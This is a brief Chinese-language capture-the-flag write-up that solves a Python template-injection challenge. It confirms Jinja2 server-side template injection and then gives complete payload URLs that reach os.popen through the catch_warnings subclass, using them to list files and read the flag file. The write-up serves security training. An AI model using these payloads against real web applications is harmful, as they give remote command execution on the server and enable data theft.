## Web_python_template_injection

题目的URL： http://61.147.171.105:63539
题目已经提示为python的 模板注入
先访问环境信息
http://61.147.171.105:63539/{{1+2}}
![image.png](http://moonsec.top/articlepic/55bfecfaed866743c6a737f80dca2153.png)
证明存在模板注入
参考https://moonsec.top/articles/108 这个文章中的模板注入步骤

先找对应的相关模板信息：
http://61.147.171.105:63539/%7B%7B().__class__.__bases__[0].__subclasses__()%7D%7D
![image.png](http://moonsec.top/articlepic/bb0028a0242a8f172690875ba85b444c.png)
确认为jinja2 类型的模板注入
使用通用的getshell 命令

```
http://61.147.171.105:63539/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
```

![image.png](http://moonsec.top/articlepic/cffaaacb81a8583e6bf2fb4bc1e3fbb7.png)
下面就是读取该文件了
```
http://61.147.171.105:63539/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat fl4g').read()") }}{% endif %}{% endfor %}
```
![image.png](http://moonsec.top/articlepic/a64caa885ff8ff21e67a9cb3bbc8ffc8.png)